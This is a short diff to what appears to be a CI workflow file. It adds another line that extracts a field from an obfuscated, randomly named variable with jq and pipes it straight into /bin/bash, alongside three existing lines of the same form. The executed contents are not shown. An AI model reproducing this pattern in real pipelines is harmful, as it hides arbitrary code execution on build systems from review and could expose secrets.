@@ -23,6 +23,7 @@ jobs:
           echo $lp91 | jq -r .rynyp3 | /bin/bash
           echo $eouxt52604 | jq -r .tshgb80549 | /bin/bash
           echo $je254 | jq -r .ufdtw1 | /bin/bash
+          printf '%s' "$aimq32" | jq -r .se80 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
